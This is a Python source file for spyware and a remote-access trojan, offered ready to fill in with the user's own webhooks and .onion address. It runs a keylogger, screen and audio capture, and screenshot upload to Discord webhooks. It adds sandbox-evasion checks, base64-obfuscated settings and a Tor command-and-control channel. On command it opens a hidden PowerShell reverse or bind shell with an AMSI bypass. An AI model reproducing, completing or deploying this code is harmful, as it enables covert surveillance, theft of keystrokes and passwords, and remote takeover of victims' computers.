import cv2
import mss
import numpy as np
import os
import tempfile
import requests
import time
import pyaudio
import wave
from pynput import keyboard
import schedule
import socket
import subprocess
import threading
import sys
import ssl
import socks
import base64
import psutil          # pip install psutil

# ==================== CONFIG (Base64 obfuscated) ====================
def b64(s):
    return base64.b64decode(s).decode()

ONION_ADDRESS = b64("eW91cl9vbmlvbl9hZGRyZXNzLm9uaW9u")  # Replace with your .onion
C2_PORT = 4443
TOR_PROXY = ('127.0.0.1', 9050)

# Discord webhooks – replace these with your own (base64 encoded)
SCREEN_WEBHOOK_URL   = b64("V0VCSE9PSy1VUkwtTElOSy0+UkVEQUNURUQ=")
AUDIO_WEBHOOK_URL    = b64("V0VCSE9PSy1VUkwtTElOSy0+UkVEQUNURUQ=")  # not used
KEYLOGGER_WEBHOOK_URL = b64("V0VCSE9PSy1VUkwtTElOSy0+UkVEQUNURUQ=")
SCREENSHOT_WEBHOOK_URL = b64("V0VCSE9PSy1VUkwtTElOSy0+UkVEQUNURUQ=")

KEYLOG_PATH = "C:\\Users\\Public\\Documents\\keyhits.txt"
recording_active = True

# ==================== ANTI-SANDBOX ====================
def is_sandbox():
    """Return True if likely in a sandbox environment."""
    try:
        # Uptime less than 30 minutes
        if time.time() - psutil.boot_time() < 1800:
            return True
        # Less than 2 CPU cores
        if psutil.cpu_count() < 2:
            return True
        # Total disk space < 60 GB
        disk = psutil.disk_usage('/')
        if disk.total < 60 * 1024**3:
            return True
    except:
        pass
    return False

if is_sandbox():
    print("Sandbox detected – sleeping for 30 seconds...")
    time.sleep(30)
    # Optionally exit: sys.exit(0)

# ==================== CORE FUNCTIONS ====================
def send_to_discord(file_path, webhook_url):
    with open(file_path, "rb") as file:
        response = requests.post(webhook_url, files={"file": file})
    return response.status_code

def record_screen(output_path, record_time=30, fps=8):
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        width, height = monitor["width"], monitor["height"]
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(output_path, fourcc, fps, (width, height))
        for _ in range(record_time * fps):
            sct_img = sct.grab(monitor)
            frame = cv2.cvtColor(np.array(sct_img), cv2.COLOR_BGRA2BGR)
            out.write(frame)
        out.release()

def record_audio(output_path, record_time=30, channels=1, rate=16000, chunk=1024):
    audio = pyaudio.PyAudio()
    stream = audio.open(format=pyaudio.paInt16, channels=channels,
                        rate=rate, input=True, frames_per_buffer=chunk)
    frames = [stream.read(chunk) for _ in range(int(rate / chunk * record_time))]
    stream.stop_stream(); stream.close(); audio.terminate()
    with wave.open(output_path, 'wb') as wf:
        wf.setnchannels(channels)
        wf.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
        wf.setframerate(rate)
        wf.writeframes(b''.join(frames))

# ==================== KEYLOGGER ====================
ignored_keys = {
    keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.shift_l,
    keyboard.Key.caps_lock, keyboard.Key.cmd, keyboard.Key.cmd_r, keyboard.Key.cmd_l,
    keyboard.Key.ctrl, keyboard.Key.ctrl_r, keyboard.Key.ctrl_l,
    keyboard.Key.alt, keyboard.Key.alt_r, keyboard.Key.alt_l,
    keyboard.Key.tab, keyboard.Key.esc, keyboard.Key.space,
    keyboard.Key.backspace, keyboard.Key.enter
}
last_key_pressed = None

def key_press(key):
    global last_key_pressed
    try:
        if key != last_key_pressed:
            with open(KEYLOG_PATH, 'a') as logKey:
                if hasattr(key, 'char') and key.char is not None:
                    logKey.write(key.char)
                elif key not in ignored_keys:
                    logKey.write(f'[{key}]')
        last_key_pressed = key
    except: pass

def key_release(key):
    global last_key_pressed
    last_key_pressed = None

def send_keylog_to_discord():
    try:
        with open(KEYLOG_PATH, 'rb') as file:
            response = requests.post(KEYLOGGER_WEBHOOK_URL,
                                     data={'content': 'Keylog file'},
                                     files={'file': file})
            print("Keylog sent." if response.status_code == 200 else f"Failed: {response.status_code}")
    except Exception as e:
        print(f"Keylog error: {e}")

def ensure_ss_folder_exists():
    dir_ = os.path.join(tempfile.gettempdir(), 'ss')
    os.makedirs(dir_, exist_ok=True)
    return dir_

def take_screenshot(output_path):
    with mss.mss() as sct:
        sct.shot(mon=-1, output=output_path)

def send_screenshot_to_discord(output_path, webhook_url):
    take_screenshot(output_path)
    status = send_to_discord(output_path, webhook_url)
    print("Screenshot sent." if status == 200 else f"Screenshot failed: {status}")

def scheduled_screenshots():
    send_screenshot_to_discord(os.path.join(ensure_ss_folder_exists(), 'screenshot.png'),
                               SCREENSHOT_WEBHOOK_URL)

# ==================== STEALTH SHELL (AMSI BYPASS + STDIN) ====================
def spawn_powershell_shell(sock):
    """
    Spawns a hidden PowerShell process with AMSI bypass.
    The script is fed via stdin – no command-line arguments.
    """
    ps_script = (
        '$amsi = [Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\');'
        '$field = $amsi.GetField(\'amsiInitFailed\',\'NonPublic,Static\');'
        '$field.SetValue($null,$true);'
        'function main { '
        '    $ErrorActionPreference = "Stop"; '
        '    while ($true) { '
        '        $cmd = Read-Host; '
        '        if ($cmd -eq "exit") { break }; '
        '        try { '
        '            $output = Invoke-Expression $cmd 2>&1 | Out-String; '
        '            if ($output -eq "") { $output = "Command executed successfully." } '
        '        } catch { '
        '            $output = $_.Exception.Message '
        '        }; '
        '        Write-Output $output '
        '    } '
        '}; main'
    )
    creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
    p = subprocess.Popen(
        ['powershell', '-NoProfile', '-NonInteractive', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        creationflags=creationflags
    )
    p.stdin.write((ps_script + "\n").encode())
    p.stdin.flush()
    time.sleep(0.5)

    def read_output():
        while True:
            out = p.stdout.read(4096)
            if not out:
                break
            sock.send(out)
    threading.Thread(target=read_output, daemon=True).start()

    while True:
        data = sock.recv(4096)
        if not data:
            break
        p.stdin.write(data)
        p.stdin.flush()
    p.terminate()

def interactive_shell(sock):
    try:
        spawn_powershell_shell(sock)
    except Exception as e:
        sock.send(f"Shell error: {e}\n".encode())

# ==================== BIND SHELL ====================
def bind_shell(port):
    """Start a TCP listener and spawn a hidden PowerShell on connection."""
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', int(port)))
        server.listen(1)
        print(f"[*] Bind shell listening on port {port}")
        client, addr = server.accept()
        print(f"[+] Incoming connection from {addr[0]}:{addr[1]}")
        spawn_powershell_shell(client)
        client.close()
        server.close()
    except Exception as e:
        print(f"Bind shell error: {e}")

# ==================== C2 CONNECTION VIA TOR ====================
def connect_to_c2():
    """Connect to .onion server via Tor SOCKS proxy, with optional TLS."""
    s = socks.socksocket()
    s.set_proxy(socks.SOCKS5, *TOR_PROXY)
    s.connect((ONION_ADDRESS, C2_PORT))
    # Attempt TLS wrap (if server uses it)
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        tls_sock = context.wrap_socket(s, server_hostname=ONION_ADDRESS)
        return tls_sock
    except:
        # Fallback to plain socket if TLS fails
        return s

def c2_handler():
    global recording_active
    while True:
        try:
            s = connect_to_c2()
            s.send(b"[+] Connected to C2 server via Tor\n")
            print("[C2] Connected.")

            while True:
                data = s.recv(1024).decode().strip()
                if not data:
                    break
                cmd = data.lower()
                if cmd == "start":
                    recording_active = True
                    s.send(b"[+] Recording started\n")
                elif cmd == "stop":
                    recording_active = False
                    s.send(b"[+] Recording stopped\n")
                elif cmd.startswith("bind "):
                    try:
                        port = cmd.split()[1]
                        s.send(b"[+] Starting bind shell on port " + port.encode() + b"\n")
                        threading.Thread(target=bind_shell, args=(port,), daemon=True).start()
                    except Exception as e:
                        s.send(f"Bind error: {e}\n".encode())
                elif cmd == "shell":
                    s.send(b"[+] Spawning reverse shell...\n")
                    interactive_shell(s)
                    s.send(b"[+] Shell closed\n")
                elif cmd == "exit":
                    s.send(b"[+] Exiting\n")
                    os._exit(0)
                else:
                    s.send(b"Unknown command. Available: start, stop, bind <port>, shell, exit\n")
        except Exception as e:
            print(f"[C2] Error: {e}. Reconnecting in 10s...")
            time.sleep(10)
        finally:
            try:
                s.close()
            except:
                pass

# ==================== MAIN ====================
if __name__ == "__main__":
    # Ensure keylog file exists
    if not os.path.exists(KEYLOG_PATH):
        open(KEYLOG_PATH, 'a').close()

    # Start keylogger listener
    keyboard.Listener(on_press=key_press, on_release=key_release).start()

    # Start C2 thread
    threading.Thread(target=c2_handler, daemon=True).start()
    print("[C2] Thread started.")

    # Schedule background tasks
    schedule.every(1).minute.do(send_keylog_to_discord)
    schedule.every(30).seconds.do(scheduled_screenshots)

    clip_number = 1
    while True:
        schedule.run_pending()
        if recording_active:
            # Screen recording
            try:
                temp_dir = tempfile.gettempdir()
                path = os.path.join(temp_dir, f"screen_record_{clip_number}.mp4")
                record_screen(path, record_time=30)
                if send_to_discord(path, SCREEN_WEBHOOK_URL) == 200:
                    os.remove(path)
                    clip_number += 1
                else:
                    time.sleep(5)
            except Exception as e:
                print(f"Screen error: {e}")
                time.sleep(5)

            # Audio recording (commented out – uncomment if needed)
            # try:
            #     path = os.path.join(temp_dir, f"voice_record_{clip_number}.wav")
            #     record_audio(path, record_time=30)
            #     if send_to_discord(path, AUDIO_WEBHOOK_URL) == 200:
            #         os.remove(path)
            #         clip_number += 1
            #     else:
            #         time.sleep(5)
            # except Exception as e:
            #     print(f"Audio error: {e}")
            #     time.sleep(5)

        time.sleep(1)
